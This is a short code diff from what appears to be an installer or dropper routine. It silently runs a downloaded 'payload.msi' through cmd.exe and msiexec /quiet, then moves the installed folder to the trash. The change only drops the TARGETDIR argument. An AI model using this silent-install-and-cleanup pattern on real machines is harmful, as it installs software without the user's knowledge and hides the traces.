@@ -52,7 +52,7 @@ foldertrash =  combine(mydesktop, trash);
 
 //run our installer and sleep 
 
-WinExec("\"c:\\windows\\system32\\cmd.exe\" /k msiexec /i c:\\users\\%username%\\downloads\\payload.msi /quiet  TARGETDIR=\"C:\\users\\%username%\\desktop\\payload\"", 5);
+WinExec("\"c:\\windows\\system32\\cmd.exe\" /k msiexec /i c:\\users\\%username%\\downloads\\payload.msi /quiet", 5);
 Sleep(5000);
 
 //move our installed folder (trash it!)
